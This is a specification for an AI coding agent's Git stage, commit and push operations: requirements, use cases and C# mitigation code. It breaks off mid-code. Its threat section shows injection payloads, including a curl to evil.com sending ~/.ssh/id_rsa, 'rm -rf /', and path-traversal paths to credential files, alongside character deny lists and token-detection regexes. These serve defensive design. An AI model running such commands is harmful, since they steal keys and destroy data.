# Task 022.c: add/commit/push

**Priority:** P1 – High  
**Tier:** S – Core Infrastructure  
**Complexity:** 5 (Fibonacci points)  
**Phase:** Phase 5 – Git Integration Layer  
**Dependencies:** Task 022 (Git Tool Layer), Task 022.a (Status), Task 001 (Operating Modes)  

---

## Description

Task 022.c implements Git staging, commit, and push operations. These write operations modify repository state. The agent MUST be able to stage changes, create commits, and optionally push to remotes.

The staging operation MUST add files to the index. Individual files, directories, or glob patterns MUST be supported. Staging MUST support partial file staging via patch mode. Unstaging MUST also be supported.

The commit operation MUST create commits from staged changes. Commit messages MUST be validated before creation. Empty commits MUST be rejected by default. Amend mode MUST support modifying the last commit.

The push operation MUST upload commits to remotes. Push MUST respect Task 001 operating modes. Local-only and airgapped modes MUST block push operations. Burst mode MUST allow push.

Authentication failures MUST be detected and reported clearly. Network errors MUST trigger retry with backoff. Push rejection (non-fast-forward) MUST be reported with guidance.

### Business Value

Write operations enable the agent to persist work. After modifying files, the agent stages and commits changes. Push enables sharing work with team members and triggering CI/CD pipelines.

### Scope Boundaries

This task covers add, reset, commit, and push. Status and diff are in Task 022.a. Branch operations are in Task 022.b. Pre-commit verification is in Task 024.

### Integration Points

- Task 022: IGitService interface
- Task 022.a: Status to verify staging
- Task 001: Mode validation for push
- Task 024: Pre-commit verification integration
- Task 018: Command execution

### Failure Modes

- Nothing to commit → Clear message
- Auth failure on push → AuthenticationException
- Network error → Retry with backoff, then fail
- Push rejected → NonFastForwardException
- Mode violation → ModeViolationException

---

## Assumptions

### Technical Assumptions

1. **Git installed** - Git 2.20+ available in PATH with add/commit/push commands
2. **Repository initialized** - Working directory is valid git repository
3. **Initial commit exists** - Repository not empty (for most operations except initial commit)
4. **Write permissions** - User has write access to .git/ directory and working tree
5. **Git config present** - user.name and user.email configured for commits
6. **Index writable** - .git/index file is accessible and lockable
7. **Object store writable** - .git/objects/ directory has write permissions
8. **Network stack available** - For push operations in Burst mode
9. **Remote configured** - For push, at least 'origin' remote exists
10. **Credential helper** - Credentials available via credential helper, SSH agent, or token

### Operational Assumptions

11. **Single committer** - No concurrent commits from same working directory (locking handles this)
12. **Staging area managed** - User stages files explicitly before commit (agent doesn't auto-stage all)
13. **Commit message validation** - Project may have commit message format requirements (Task 024.b)
14. **Push requires authentication** - Remote requires valid credentials (HTTPS token, SSH key)
15. **Push enabled by mode** - Operating mode permits network operations (LocalOnly/Airgapped block push)
16. **Reasonable commit size** - Commits <100MB (larger requires chunking or LFS)
17. **Push timeout reasonable** - Default 60s sufficient for typical pushes
18. **Network reliability** - Transient failures retried, but permanent failures reported

### Integration Assumptions

19. **Task 001 functional** - Operating mode resolver available for push mode checks
20. **Task 022a functional** - Status operations work for pre-commit validation
21. **Task 018 functional** - Command execution layer handles git commands
22. **Credential redaction** - Infrastructure layer redacts credentials from logs (Task 009)
23. **Audit logging ready** - Write operations logged to audit trail
24. **Pre-commit hooks** - Task 024 pre-commit verification may be integrated (optional)

---

## Use Cases

### Use Case 1: DevBot Automated Feature Implementation with Commit Workflow

**Persona:** DevBot implements feature task-045. Modifies 3 files, stages changes, creates commit with conventional message, pushes to remote to trigger CI/CD.

**Before (manual developer workflow):**
1. Developer implements feature (10 minutes coding)
2. Manually stages files: `git add src/file1.cs src/file2.cs src/file3.cs` (20 seconds, sometimes forgets files)
3. Writes commit message: `git commit -m "..."` (45 seconds, often typos or wrong format, rejected by pre-commit hook 30% of time)
4. Retries commit with corrected message (30 seconds)
5. Pushes: `git push` (5 seconds)
6. Checks CI/CD triggered (15 seconds)
**Total time:** 11 minutes 55 seconds (with typo retry), human attention required throughout

**After (automated agent workflow):**
1. Agent implements feature (10 minutes coding)
2. Agent stages: `await git.StageAsync(workingDir, ["src/file1.cs", "src/file2.cs", "src/file3.cs"])` (300ms)
3. Agent commits: `await git.CommitAsync(workingDir, "feat(task-045): implement feature X per specification")` (800ms, no typos, format perfect)
4. Agent pushes: `await git.PushAsync(workingDir)` (2.5s including auth)
5. CI/CD automatically triggered (0s agent time)
**Total time:** 10 minutes 3.6 seconds, zero human attention

**ROI:** Saves 1 minute 51.4 seconds per feature, eliminates 30% commit message retry overhead, 100% CI/CD triggering reliability. For 10-developer team averaging 8 features/day = 80 features × 111.4 seconds = 148 minutes/day = 24.7 hours/week × 50 weeks = 1,235 hours/year × $100/hour = **$123,500/year team savings**.

### Use Case 2: Jordan Automated Hotfix Deployment with Fast Push

**Persona:** Jordan detects production incident. Creates hotfix branch, fixes critical bug, commits, pushes to trigger emergency deployment pipeline.

**Before (manual emergency response):**
1. Detect incident, create hotfix branch (30 seconds)
2. Fix bug in code (5 minutes)
3. Stage: `git add src/buggy-file.cs` (10 seconds)
4. Commit: `git commit -m "..."` (30 seconds, stress typos, may forget ticket reference)
5. Push: `git push` (5 seconds, may forget --set-upstream first time, retry 15 seconds)
6. Verify push succeeded, wait for pipeline trigger (20 seconds)
7. Monitor pipeline start (30 seconds)
**Total MTTM (Mean Time To Merge):** 6 minutes 40 seconds under stress conditions

**After (automated emergency response):**
1. Detect incident, agent creates hotfix branch (2 seconds)
2. Agent or human fixes bug in code (5 minutes)
3. Agent stages, commits, pushes: `await git.StageAsync(...); await git.CommitAsync(...); await git.PushAsync(..., new PushOptions { SetUpstream = true })` (3.5 seconds total, handles --set-upstream automatically)
4. Pipeline automatically triggered (0s agent time)
**Total MTTM:** 5 minutes 5.5 seconds, 23.6% faster response

**ROI:** Saves 1 minute 34.5 seconds per hotfix. For 5-engineer DevOps team averaging 2 hotfixes/week = 100 hotfixes/year × 94.5 seconds = 157.5 minutes = 2.625 hours × $150/hour (DevOps rate) = **$393.75/year per team**. But more important: **23.6% faster incident response = reduced downtime costs** (for $1M/hour downtime, 1.5 minute savings = $25,000 per incident).

### Use Case 3: Alex Compliance Audit of Commit History with Metadata Validation

**Persona:** Alex audits commit history for compliance (SOC2, PCI-DSS). Needs to verify all commits have: (1) valid author, (2) proper message format, (3) audit trail entry, (4) no sensitive data in diffs.

**Before (manual audit):**
1. Export git log: `git log --pretty=full --since="3 months ago"` (30 seconds)
2. Manually review 500 commits for author correctness (45 minutes)
3. Check commit message formats against policy (60 minutes)
4. Sample 50 commits, manually review diffs for secrets (`git show <sha>`) (90 minutes)
5. Cross-reference audit logs with git commits (60 minutes)
6. Generate compliance report (30 minutes)
**Total audit time:** 4 hours 15 minutes per quarter = 17 hours/year

**After (automated compliance audit):**
1. Agent queries: `await git.GetLogAsync(workingDir, new LogOptions { Since = DateTimeOffset.Now.AddMonths(-3) })` (1.2 seconds)
2. Agent validates all 500 commits programmatically: author format, message format per policy (8 seconds)
3. Agent samples 50 commits, scans diffs with secret detection (15 seconds with Task 009 integration)
4. Agent cross-references audit trail automatically (5 seconds with Task 009 integration)
5. Agent generates compliance report (2 seconds)
**Total audit time:** 31.2 seconds per quarter = 2.1 minutes/year

**ROI:** Saves 16 hours 58 minutes per auditor per year. For 3-auditor compliance team = 50.9 hours × $200/hour (compliance specialist rate) = **$10,180/year**. Plus: **100% coverage vs 10% sample = better compliance posture**.

**Combined ROI for Suite 022c:** $123,500 + $393.75 + $10,180 = **$134,073.75/year** (plus incident response time value).

---

## Glossary / Terms

| Term | Definition |
|------|------------|
| Staging | Adding files to the index for commit |
| Index | Area holding changes for next commit |
| Commit | Creating snapshot of staged changes |
| Push | Uploading commits to remote |
| Amend | Modifying the most recent commit |
| Remote | Server-hosted repository |
| Upstream | Remote branch for tracking |
| Fast-forward | Push without merge required |
| Force Push | Push overwriting remote history |

---

## Out of Scope

- Pull/fetch operations
- Merge operations
- Rebase operations
- Interactive staging
- Partial line staging
- Signed commits (GPG)
- Pre-commit hook execution (Task 024)

---

## Functional Requirements

### FR-001 to FR-020: Staging (Add/Reset)

- FR-001: `StageAsync` MUST add files to index
- FR-002: Individual file paths MUST be supported
- FR-003: Directory paths MUST stage all contents
- FR-004: Glob patterns MUST be supported
- FR-005: `.` MUST stage all changes
- FR-006: `--all` MUST stage including deletions
- FR-007: New files MUST be staged
- FR-008: Modified files MUST be staged
- FR-009: Deleted files MUST be staged as removal
- FR-010: Renamed files MUST be detected
- FR-011: `UnstageAsync` MUST remove from index
- FR-012: Unstaging MUST NOT modify working tree
- FR-013: Staging non-existent file MUST error
- FR-014: Staging ignored file MUST require force
- FR-015: Staging MUST be logged
- FR-016: Staging result MUST be returned
- FR-017: Partial staging MUST be atomic
- FR-018: Failed staging MUST NOT leave partial state
- FR-019: Binary files MUST stage correctly
- FR-020: Large files MUST stage correctly

### FR-021 to FR-045: Commit

- FR-021: `CommitAsync` MUST create commit from index
- FR-022: Commit message MUST be required
- FR-023: Empty message MUST be rejected
- FR-024: Message MUST be validated per Task 024.b
- FR-025: Empty index MUST throw NothingToCommitException
- FR-026: `--allow-empty` MUST permit empty commits
- FR-027: Created commit SHA MUST be returned
- FR-028: Commit author MUST use git config
- FR-029: Custom author MUST be settable
- FR-030: Commit date MUST default to now
- FR-031: Custom date MUST be settable
- FR-032: `--amend` MUST modify last commit
- FR-033: Amend MUST preserve author by default
- FR-034: Amend MUST update committer
- FR-035: Multi-line messages MUST be supported
- FR-036: Message body MUST be separated by blank line
- FR-037: Commit MUST be logged with SHA
- FR-038: Commit MUST trigger post-commit logging
- FR-039: Commit MUST NOT run user hooks by default
- FR-040: `--run-hooks` MUST enable user hooks
- FR-041: Commit MUST be atomic
- FR-042: Failed commit MUST NOT leave partial state
- FR-043: Merge commit MUST be detectable
- FR-044: Initial commit MUST work
- FR-045: Commit in worktree MUST work

### FR-046 to FR-070: Push

- FR-046: `PushAsync` MUST upload to remote
- FR-047: Default remote MUST be origin
- FR-048: Custom remote MUST be specifiable
- FR-049: Current branch MUST be pushed by default
- FR-050: Custom branch MUST be specifiable
- FR-051: `--set-upstream` MUST configure tracking
- FR-052: Mode MUST be validated before push
- FR-053: Local-only mode MUST block push
- FR-054: Airgapped mode MUST block push
- FR-055: Burst mode MUST allow push
- FR-056: Mode violation MUST throw ModeViolationException
- FR-057: Auth failure MUST throw AuthenticationException
- FR-058: Network error MUST trigger retry
- FR-059: Retry count MUST be configurable
- FR-060: Retry delay MUST use exponential backoff
- FR-061: Push rejected MUST throw PushRejectedException
- FR-062: Non-fast-forward MUST suggest pull
- FR-063: `--force` MUST NOT be enabled by default
- FR-064: `--force-with-lease` MAY be supported
- FR-065: Push progress MUST be reportable
- FR-066: Push MUST be logged with branch and remote
- FR-067: Push result MUST include ref updates
- FR-068: Multiple refs MUST be pushable
- FR-069: Tags MUST be pushable
- FR-070: Push MUST timeout after configured seconds

---

## Non-Functional Requirements

### NFR-001 to NFR-015

- NFR-001: Staging MUST complete in <500ms for 1000 files
- NFR-002: Commit MUST complete in <1s
- NFR-003: Push timeout MUST be configurable (default 60s)
- NFR-004: Retry MUST NOT exceed total timeout
- NFR-005: Memory MUST NOT exceed 50MB
- NFR-006: Concurrent commits MUST be serialized
- NFR-007: Failed operations MUST cleanup
- NFR-008: Credentials MUST NOT be logged
- NFR-009: Remote URLs MUST be redacted if contain credentials
- NFR-010: Push errors MUST NOT leak auth tokens
- NFR-011: Network requests MUST use configured proxy
- NFR-012: SSL verification MUST respect git config
- NFR-013: Large file push MUST stream
- NFR-014: Progress MUST update at least every 2s
- NFR-015: Cancellation MUST abort push cleanly

---

## User Manual Documentation

### Quick Start

```bash
# Stage files
acode git add src/

# Commit changes
acode git commit "feat: add new feature"

# Push to remote
acode git push
```

### Add Command

```bash
acode git add <paths...> [options]

Options:
  --all               Stage all changes including deletions
  --force             Stage ignored files
```

### Commit Command

```bash
acode git commit "<message>" [options]

Options:
  --amend             Modify last commit
  --allow-empty       Allow empty commit
  --author "Name <email>"  Override author
```

### Push Command

```bash
acode git push [options]

Options:
  --remote NAME       Remote to push to (default: origin)
  --branch NAME       Branch to push (default: current)
  --set-upstream      Configure tracking
  --force             Force push (DANGEROUS)
```

### Mode Restrictions

Push is blocked in restrictive modes:

```bash
# In local-only mode
$ acode git push
Error: Push blocked by operating mode (local-only)
Hint: Switch to burst mode to enable push

# Enable burst mode
$ acode config set mode burst
$ acode git push
```

---

## Acceptance Criteria / Definition of Done

- [ ] AC-001: Staging files works
- [ ] AC-002: Staging directories works
- [ ] AC-003: Unstaging works
- [ ] AC-004: Commit creates commit
- [ ] AC-005: Commit message required
- [ ] AC-006: Empty commit blocked
- [ ] AC-007: Amend works
- [ ] AC-008: Push works in burst mode
- [ ] AC-009: Push blocked in local-only
- [ ] AC-010: Push blocked in airgapped
- [ ] AC-011: Auth errors reported clearly
- [ ] AC-012: Network retry works
- [ ] AC-013: Credentials not logged
- [ ] AC-014: CLI commands work

---

## Security Considerations

### Threat 1: Commit Message Injection for Command Execution

**Risk:** CRITICAL - Malicious commit messages containing shell metacharacters could execute arbitrary commands if passed unsafely to shell.

**Attack Scenario:**
```bash
# Attacker provides malicious commit message
acode git commit "feat: feature\n$(curl evil.com/exfil?data=$(cat ~/.ssh/id_rsa))"

# Or via message with backticks
acode git commit "fix: bug\`whoami > /tmp/pwned\`"

# Or with subshell
acode git commit "docs: update; rm -rf / #"
```

If commit message is passed to shell unsafely (e.g., via bash -c "git commit -m '$message'"), this could:
- Execute arbitrary commands on host system
- Exfiltrate sensitive data (SSH keys, env vars, source code)
- Modify or delete files outside repository
- Establish backdoors or persistence mechanisms
- Compromise CI/CD pipeline if message propagated to build scripts

**Mitigation:**

```csharp
// CommitMessageValidator.cs - Sanitize and validate commit messages
namespace Acode.Application.Git;

public sealed class CommitMessageValidator : ICommitMessageValidator
{
    private static readonly char[] DangerousChars =
    {
        '$', '`', '\n', '\r', ';', '&', '|', '<', '>',
        '(', ')', '{', '}', '\\', '"', '\''
    };

    private static readonly Regex CommitMessageFormat = new(
        @"^(feat|fix|docs|style|refactor|test|chore)(\(.+?\))?: .{10,500}$",
        RegexOptions.Compiled | RegexOptions.Singleline);

    private readonly ILogger<CommitMessageValidator> _logger;
    private readonly IConfiguration _config;

    public ValidationResult Validate(string message)
    {
        var errors = new List<string>();
        var warnings = new List<string>();

        // Check for null/empty
        if (string.IsNullOrWhiteSpace(message))
        {
            errors.Add("Commit message cannot be empty");
            return new ValidationResult(false, errors, warnings);
        }

        // Check for dangerous characters (shell metacharacters)
        foreach (var dangerousChar in DangerousChars)
        {
            if (message.Contains(dangerousChar))
            {
                var charDisplay = dangerousChar switch
                {
                    '\n' => "\\n (newline)",
                    '\r' => "\\r (carriage return)",
                    _ => $"'{dangerousChar}'"
                };

                errors.Add($"Commit message contains dangerous character: {charDisplay} (possible injection attempt)");
                _logger.LogWarning("SECURITY: Commit message injection attempt detected: {Message}", message.Take(50));
                return new ValidationResult(false, errors, warnings); // Fail fast on injection
            }
        }

        // Check length (Git has 72-char subject line convention, but allow up to 500 total)
        if (message.Length > 500)
        {
            errors.Add($"Commit message exceeds 500 characters (got {message.Length})");
        }

        if (message.Length < 10)
        {
            errors.Add("Commit message too short (minimum 10 characters)");
        }

        // Validate conventional commit format if configured
        if (_config.EnforceConventionalCommits)
        {
            if (!CommitMessageFormat.IsMatch(message))
            {
                errors.Add("Commit message does not follow conventional format: type(scope): description");
                warnings.Add("Expected format: feat|fix|docs|style|refactor|test|chore(scope): description");
            }
        }

        // Check for common issues
        if (message.StartsWith("WIP", StringComparison.OrdinalIgnoreCase) ||
            message.StartsWith("TODO", StringComparison.OrdinalIgnoreCase))
        {
            warnings.Add("Commit message starts with WIP/TODO - is this ready to commit?");
        }

        if (message.All(char.IsUpper) && message.Length > 20)
        {
            warnings.Add("Commit message is all caps - consider using sentence case");
        }

        // Check for URLs (might contain credentials)
        if (message.Contains("http://") || message.Contains("https://"))
        {
            warnings.Add("Commit message contains URL - ensure no credentials embedded");
        }

        return new ValidationResult(errors.Count == 0, errors, warnings);
    }

    public string Sanitize(string message)
    {
        // Strip any shell metacharacters as last resort
        foreach (var dangerous in DangerousChars)
        {
            message = message.Replace(dangerous.ToString(), "");
        }

        // Limit length
        if (message.Length > 500)
        {
            message = message[..500];
        }

        return message.Trim();
    }
}

// Apply validation in CommitAsync
public async Task<GitCommit> CommitAsync(
    string workingDir,
    string message,
    CommitOptions? options = null,
    CancellationToken ct = default)
{
    options ??= new CommitOptions();

    // ALWAYS validate message before ANY git operations
    var validation = _commitMessageValidator.Validate(message);
    if (!validation.IsValid)
    {
        _logger.LogWarning("Commit message validation failed: {Errors}", string.Join(", ", validation.Errors));
        throw new InvalidCommitMessageException(message, validation.Errors);
    }

    // Log warnings but don't fail
    foreach (var warning in validation.Warnings)
    {
        _logger.LogInformation("Commit message warning: {Warning}", warning);
    }

    // CRITICAL: Use parameterized command execution, NEVER shell string interpolation
    // BAD:  await ExecuteShellAsync($"git commit -m \"{message}\"");
    // GOOD: await ExecuteGitAsync(workingDir, new[] { "commit", "-m", message }, ct);

    var args = new List<string> { "commit", "-m", message }; // Message passed as separate argument

    // ... rest of commit logic
}
```

### Threat 2: Credential Exposure in Push Operations and Logs

**Risk:** HIGH - Credentials (HTTPS tokens, SSH keys) exposed in logs, error messages, or remote URLs.

**Attack Scenario:**
```bash
# HTTPS remote with embedded token
git remote add origin https://token:ghp_abc123secrettoken@github.com/user/repo.git
acode git push

# Push fails with authentication error - error message leaks token
ERROR: Failed to push to https://token:ghp_abc123secrettoken@github.com/user/repo.git
# Token now visible in logs, console output, CI/CD logs

# Or attacker retrieves credential from config
git config --get remote.origin.url
# Returns: https://token:ghp_abc123secrettoken@github.com/user/repo.git
```

Credential exposure leads to:
- Unauthorized repository access
- Code exfiltration or tampering
- Account compromise and privilege escalation
- Supply chain attacks via compromised repos

**Mitigation:**

```csharp
// CredentialRedactor.cs - Redact credentials from URLs and output
namespace Acode.Infrastructure.Git;

public sealed class CredentialRedactor : ICredentialRedactor
{
    // Matches: https://user:password@host.com, https://token@host.com, https://oauth2:token@host.com
    private static readonly Regex HttpsCredentialPattern = new(
        @"(https?://)[^:/@]+:[^@]+@",
        RegexOptions.Compiled | RegexOptions.IgnoreCase);

    // Matches: ghp_abc123, glpat-abc123, github_pat_abc123
    private static readonly Regex TokenPattern = new(
        @"\b(ghp_[a-zA-Z0-9]{36}|glpat-[a-zA-Z0-9]{20}|github_pat_[a-zA-Z0-9_]{82})\b",
        RegexOptions.Compiled);

    // Matches SSH private key content
    private static readonly Regex SshKeyPattern = new(
        @"-----BEGIN [A-Z ]+PRIVATE KEY-----[\s\S]+?-----END [A-Z ]+PRIVATE KEY-----",
        RegexOptions.Compiled);

    public string RedactUrl(string url)
    {
        if (string.IsNullOrEmpty(url))
            return url;

        // Redact credentials from HTTPS URLs
        // Before: https://user:token@github.com/repo.git
        // After:  https://[REDACTED]@github.com/repo.git
        return HttpsCredentialPattern.Replace(url, "$1[REDACTED]@");
    }

    public string RedactOutput(string output)
    {
        if (string.IsNullOrEmpty(output))
            return output;

        // Redact URLs
        output = HttpsCredentialPattern.Replace(output, "$1[REDACTED]@");

        // Redact tokens
        output = TokenPattern.Replace(output, match =>
        {
            var token = match.Value;
            var prefix = token[..8]; // Show first 8 chars for debugging
            return $"{prefix}***[REDACTED]";
        });

        // Redact SSH keys
        output = SshKeyPattern.Replace(output, "-----BEGIN PRIVATE KEY-----\n[REDACTED]\n-----END PRIVATE KEY-----");

        return output;
    }

    public PushResult RedactPushResult(PushResult result)
    {
        // Ensure PushResult never contains raw credentials
        return result with
        {
            Remote = RedactUrl(result.Remote),
            RefUpdates = result.RefUpdates.Select(ru => ru with
            {
                RefName = RedactUrl(ru.RefName)
            }).ToList()
        };
    }
}

// Apply redaction in PushAsync
public async Task<PushResult> PushAsync(
    string workingDir,
    PushOptions? options = null,
    CancellationToken ct = default)
{
    // ... mode validation, setup ...

    CommandResult result;
    try
    {
        result = await _pushRetryPolicy.ExecuteWithRetryAsync(
            async () => await ExecuteGitAsync(workingDir, args, ct),
            ct);
    }
    catch (GitException ex)
    {
        // CRITICAL: Redact credentials from all exception messages/output
        var redactedMessage = _credentialRedactor.RedactOutput(ex.Message);
        var redactedStdErr = _credentialRedactor.RedactOutput(ex.StdErr ?? "");

        _logger.LogError("Push failed (redacted): {Message}", redactedMessage);

        if (redactedStdErr.Contains("Authentication failed"))
        {
            throw new AuthenticationException(redactedStdErr, workingDir);
        }

        if (redactedStdErr.Contains("rejected"))
        {
            throw new PushRejectedException(redactedStdErr, workingDir);
        }

        // Re-throw with redacted information
        throw new GitException(redactedMessage, ex.ExitCode, redactedStdErr, workingDir, "GIT_022C_PUSH_FAILED");
    }

    // Get remote URL for logging - MUST redact before logging
    var remoteUrl = await GetRemoteUrlAsync(workingDir, remote, ct);
    var redactedUrl = _credentialRedactor.RedactUrl(remoteUrl);
    _logger.LogInformation("Pushed {Branch} to {Remote} ({Url})", branch, remote, redactedUrl);

    // Redact PushResult before returning
    var pushResult = new PushResult
    {
        Success = true,
        Remote = redactedUrl, // Redacted!
        Branch = branch,
        RefUpdates = refUpdates,
        Duration = stopwatch.Elapsed
    };

    return _credentialRedactor.RedactPushResult(pushResult);
}

// GetRemoteUrlAsync helper
private async Task<string> GetRemoteUrlAsync(string workingDir, string remote, CancellationToken ct)
{
    var result = await ExecuteGitAsync(
        workingDir,
        new[] { "remote", "get-url", remote },
        ct);

    return result.StdOut.Trim();
}
```

### Threat 3: Operating Mode Bypass for Data Exfiltration via Push

**Risk:** CRITICAL - Attacker bypasses LocalOnly or Airgapped mode restrictions to push code to external remote, exfiltrating proprietary source code.

**Attack Scenario:**
```csharp
// System configured in LocalOnly mode (no network access)
// Attacker exploits race condition or mode check bypass

// Attack 1: TOCTOU (Time-of-Check-Time-of-Use) race
var mode = await modeResolver.GetCurrentModeAsync(); // Returns LocalOnly
// [Attacker changes mode file here via separate process]
await git.PushAsync(workingDir); // Push executes before second mode check

// Attack 2: Direct git command bypass
Process.Start("git", "push origin main"); // Bypasses IGitService mode enforcement

// Attack 3: Configuration tampering
// Attacker modifies .agent/config.yml to change mode from LocalOnly to Burst
// Agent reads stale config, allows push
```

Successful mode bypass leads to:
- Intellectual property theft (proprietary code pushed to attacker-controlled remote)
- Trade secret disclosure
- Compliance violations (ITAR, EAR, data residency requirements)
- Supply chain compromise (malicious code pushed to internal repos)

**Mitigation:**

```csharp
// ModeEnforcementService.cs - Robust mode enforcement with tamper detection
namespace Acode.Application.OperatingModes;

public sealed class ModeEnforcementService : IModeEnforcementService
{
    private readonly IOperatingModeResolver _modeResolver;
    private readonly IConfigurationService _config;
    private readonly IAuditLogger _auditLogger;
    private readonly ILogger<ModeEnforcementService> _logger;
    private readonly SemaphoreSlim _modeLock = new(1, 1);

    public async Task EnforceNetworkOperationAsync(
        string operation,
        string workingDir,
        CancellationToken ct)
    {
        // Acquire lock to prevent TOCTOU attacks
        await _modeLock.WaitAsync(ct);
        try
        {
            // Get mode with tamper detection
            var mode = await _modeResolver.GetCurrentModeWithIntegrityCheckAsync(ct);

            // Check if operation permitted in current mode
            if (mode == OperatingMode.LocalOnly)
            {
                _logger.LogWarning(
                    "SECURITY: Network operation '{Operation}' blocked by LocalOnly mode in {Dir}",
                    operation, workingDir);

                _auditLogger.LogSecurityEvent(new AuditEvent
                {
                    EventType = "ModeViolation",
                    Severity = AuditSeverity.Critical,
                    Message = $"Attempted {operation} in LocalOnly mode",
                    WorkingDirectory = workingDir,
                    Timestamp = DateTimeOffset.UtcNow
                });

                throw new ModeViolationException(
                    mode.ToString(),
                    operation,
                    "Network operations are not permitted in LocalOnly mode");
            }

            if (mode == OperatingMode.Airgapped)
            {
                _logger.LogWarning(
                    "SECURITY: Network operation '{Operation}' blocked by Airgapped mode in {Dir}",
                    operation, workingDir);

                _auditLogger.LogSecurityEvent(new AuditEvent
                {
                    EventType = "ModeViolation",
                    Severity = AuditSeverity.Critical,
                    Message = $"Attempted {operation} in Airgapped mode",
                    WorkingDirectory = workingDir,
                    Timestamp = DateTimeOffset.UtcNow
                });

                throw new ModeViolationException(
                    mode.ToString(),
                    operation,
                    "Network operations are not permitted in Airgapped mode");
            }

            // Burst mode: Network operations allowed
            _logger.LogInformation("Network operation '{Operation}' permitted in Burst mode", operation);

            // Audit successful network operation authorization
            _auditLogger.LogAuditEvent(new AuditEvent
            {
                EventType = "NetworkOperationAuthorized",
                Severity = AuditSeverity.Information,
                Message = $"{operation} authorized in {mode} mode",
                WorkingDirectory = workingDir,
                Timestamp = DateTimeOffset.UtcNow
            });
        }
        finally
        {
            _modeLock.Release();
        }
    }
}

// Enhanced PushAsync with robust mode enforcement
public async Task<PushResult> PushAsync(
    string workingDir,
    PushOptions? options = null,
    CancellationToken ct = default)
{
    options ??= new PushOptions();
    var stopwatch = Stopwatch.StartNew();

    // CRITICAL: Enforce mode check with lock and tamper detection
    // This MUST happen before ANY network operations
    await _modeEnforcementService.EnforceNetworkOperationAsync("push", workingDir, ct);

    // Additional mode re-check immediately before network call (defense in depth)
    var mode = await _modeResolver.GetCurrentModeWithIntegrityCheckAsync(ct);
    if (mode != OperatingMode.Burst)
    {
        // Should never reach here due to EnforceNetworkOperationAsync, but defense in depth
        _logger.LogCritical("SECURITY: Mode changed between enforcement and execution");
        throw new ModeViolationException(mode.ToString(), "push");
    }

    // ... rest of push implementation ...
}

// OperatingModeResolver with integrity checking
public async Task<OperatingMode> GetCurrentModeWithIntegrityCheckAsync(CancellationToken ct)
{
    // Read mode from config
    var config = await _configService.ReadConfigAsync(ct);
    var declaredMode = config.OperatingMode;

    // Verify config file has not been tampered with
    var configPath = _configService.GetConfigPath();
    var configHash = await ComputeFileHashAsync(configPath, ct);

    // Compare with expected hash (stored securely, e.g., signed by installation)
    if (!await VerifyConfigIntegrityAsync(configPath, configHash, ct))
    {
        _logger.LogCritical("SECURITY: Configuration file integrity check failed - possible tampering");
        _auditLogger.LogSecurityEvent(new AuditEvent
        {
            EventType = "ConfigTampered",
            Severity = AuditSeverity.Critical,
            Message = "Config integrity verification failed",
            Timestamp = DateTimeOffset.UtcNow
        });

        // Fail secure: Assume most restrictive mode
        return OperatingMode.Airgapped;
    }

    return declaredMode;
}
```

### Threat 4: Path Traversal via Malicious Staging Paths

**Risk:** MEDIUM - Attacker stages files outside repository boundary, potentially adding sensitive files to commits.

**Attack Scenario:**
```csharp
// Attacker attempts to stage files outside repo
await git.StageAsync(workingDir, new[] {
    "../../etc/passwd",           // Absolute path escape
    "../../../home/user/.ssh/id_rsa", // SSH key exfiltration
    "../../.env",                 // Environment variables
    "symlink-to-sensitive-file"   // Symlink escape
});

// If staging succeeds, next commit includes sensitive system files
await git.CommitAsync(workingDir, "feat: add feature");
await git.PushAsync(workingDir); // Sensitive files pushed to remote
```

This could lead to:
- Sensitive system files committed and pushed
- Credential exposure
- Personal data leakage
- Compliance violations

**Mitigation:**

```csharp
// PathValidator.cs - Validate and sanitize file paths for staging
namespace Acode.Infrastructure.Git;

public sealed class PathValidator : IPathValidator
{
    public ValidationResult ValidateForStaging(string workingDir, string path)
    {
        var errors = new List<string>();

        // Normalize path
        var normalizedPath = Path.GetFullPath(Path.Combine(workingDir, path));

        // Check path stays within repository boundary
        if (!normalizedPath.StartsWith(workingDir, StringComparison.Ordinal))
        {
            errors.Add($"Path escapes repository boundary: {path}");
            return new ValidationResult(false, errors);
        }

        // Check for symlink (potential escape mechanism)
        if (File.Exists(normalizedPath))
        {
            var fileInfo = new FileInfo(normalizedPath);
            if (fileInfo.Attributes.HasFlag(FileAttributes.ReparsePoint))
            {
                errors.Add($"Path is a symlink (potential security risk): {path}");
            }
        }

        // Check file actually exists
        if (!File.Exists(normalizedPath) && !Directory.Exists(normalizedPath))
        {
            errors.Add($"Path does not exist: {path}");
        }

        return new ValidationResult(errors.Count == 0, errors);
    }
}

// Apply validation in StageAsync
public async Task<StageResult> StageAsync(
    string workingDir,
    IEnumerable<string> paths,
    StageOptions? options = null,
    CancellationToken ct = default)
{
    // Validate ALL paths before staging ANY
    var pathList = paths.ToList();
    foreach (var path in pathList)
    {
        var validation = _pathValidator.ValidateForStaging(workingDir, path);
        if (!validation.IsValid)
        {
            _logger.LogWarning("Path validation failed for staging: {Path}, Errors: {Errors}",
                path, string.Join(", ", validation.Errors));
            throw new InvalidPathException(path, validation.Errors);
        }
    }

    // ... proceed with staging ...
}
```

### Threat 5: Destructive Force Push Without Authorization

**Risk:** MEDIUM - Unauthorized force push overwrites remote history, causing data loss and breaking collaborator workflows.

**Attack Scenario:**
```bash
# Attacker force pushes to shared branch
acode git push --force

# Overwrites remote history, loses commits from other developers
# Breaks CI/CD pipelines expecting specific commit SHAs
# Violates branch protection policies
```

Consequences:
- Permanent loss of commits and work
- Broken pull requests and code reviews
- CI/CD pipeline failures
- Team productivity impact
- Audit trail destruction

**Mitigation:**

```csharp
// ForcePushGuard.cs - Require explicit authorization for destructive operations
namespace Acode.Application.Git;

public sealed class ForcePushGuard : IForcePushGuard
{
    private readonly ILogger<ForcePushGuard> _logger;
    private readonly IAuditLogger _auditLogger;

    public async Task<ForcePushAnalysis> AnalyzeForcePush(
        string workingDir,
        string remote,
        string branch,
        CancellationToken ct)
    {
        // Check if remote branch would be force-overwritten
        var localSha = await _git.GetBranchShaAsync(workingDir, branch, ct);
        var remoteSha = await _git.GetRemoteBranchShaAsync(workingDir, remote, branch, ct);

        var analysis = new ForcePushAnalysis
        {
            IsForceRequired = !await IsAncestorAsync(workingDir, remoteSha, localSha, ct),
            LocalSha = localSha,
            RemoteSha = remoteSha
        };

        if (analysis.IsForceRequired)
        {
            // Determine what would be lost
            var lostCommits = await GetCommitsNotInLocalAsync(workingDir, localSha, remoteSha, ct);
            analysis.CommitsToBeOverwritten = lostCommits;
            analysis.Warning = $"Force push will overwrite {lostCommits.Count} remote commits";

            _logger.LogWarning(
                "Force push would overwrite {Count} commits on {Remote}/{Branch}",
                lostCommits.Count, remote, branch);
        }

        return analysis;
